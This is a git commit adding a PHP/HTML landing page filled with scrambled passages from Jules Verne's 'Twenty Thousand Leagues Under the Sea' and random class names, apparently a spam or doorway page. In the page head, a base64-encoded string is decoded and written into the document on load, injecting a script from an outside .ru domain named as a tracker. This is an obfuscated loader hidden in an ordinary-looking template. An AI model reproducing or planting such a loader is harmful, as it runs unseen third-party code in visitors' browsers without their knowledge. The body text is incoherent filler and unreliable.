0e957643592acc861a433dcbb327a0b2d2c7750c
cqjnntdg <77446516+cqjnntdg@users.noreply.github.com>
2021-01-14 15:43:16 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The captain then decided to take more direct means.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8yM2FjNzdxbDZ2dHFjcWVvcWUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="utrw15tuhz5u44j3c6">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="klozvbhqho5bj3f0cetuwaea">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The captain then decided to take more direct means.</h1>
+	</section>
+
+
+	<section class="our-work" class="1j1lc123xwquttn3716bfs8">
+		<h3 class="title">A little more, said Conseil, and they would be perf</h3>
+		<p>Ned Land and Conseil were near me. We watched, and I thought I was going to witness a strange scene. On observing the ground, I saw that it was raised in certain places by slight excrescences incrusted with limy deposits, and disposed with a regularity that betrayed the hand of man. I approached, and was bound to believe my own eyes. There, at a hole bored in one of the dragon trees, were some thousands of these ingenious insects, so common in all the Canaries, and whose produce is so much esteemed. Naturally enough, the Canadian wished to gather the honey, and I could not well oppose his wish. A quantity of dry leaves, mixed with sulphur, he lit with a spark from his flint, and he began to smoke out the bees. The humming ceased by degrees, and the hive eventually yielded several pounds of the sweetest honey, with which Ned Land filled his haversack. La Perouse, and his second, Captain de Langle, were sent by Louis XVI, in 1785, on a voyage of circumnavigation. They embarked in the corvettes the Boussole and the Astrolabe, neither of which were again heard of. In 1791 the French government, justly uneasy as to the fate of these two sloops, manned two large merchantmen, the Recherche and the Esperance, which left Brest the 28th of September, under the command of Bruni d'Entrecasteaux. I cast a last look upon the sea, slightly yellowed by the Japanese coast, and descended to the saloon.</p>
+		<hr>
+
+		<ul class="grid" class="43cma5o3ijyj9z6fu0g">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="utrw15tuhz5u44j3c6">
+		<h3 class="title">After crossing a rather large prairie, we </h3>
+		<p>Where are we? I asked. The man had approached, and with his face flattened against the glass, was looking at us. Saying which, Captain Nemo unfurled a black banner, bearing an N in gold quartered on its bunting. Then turning toward the orb of day, whose last rays lapped the horizon of the sea, he exclaimed: Does master call me? asked Conseil.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="klozvbhqho5bj3f0cetuwaea" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="43cma5o3ijyj9z6fu0g" class="title">We are off! murmured Conseil in my ear.</h3>	
+		<p>The orifice in the plates of the Nautilus was first closed, and fastened down by means of a false key, with which Ned Land had provided himself; the opening in the boat was also closed. The Canadian began to loosen the bolts which still held us to the submarine boat. Ah! said Captain Nemo quietly. They are come with their canoes? Some four-footed game, M. Aronnax. All these pigeons are only side-dishes and trifles; and until I have killed an animal with cutlets, I shall not be content. As you please, sir, Conseil replied.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="utrw15tuhz5u44j3c6">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="klozvbhqho5bj3f0cetuwaea"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="1j1lc123xwquttn3716bfs8"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="43cma5o3ijyj9z6fu0g"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>537 Swift Meadow, Apt. 207, 65921, Icieton, Louisiana, United States</p>
+	</footer>
+
+</body>
+
+</html>
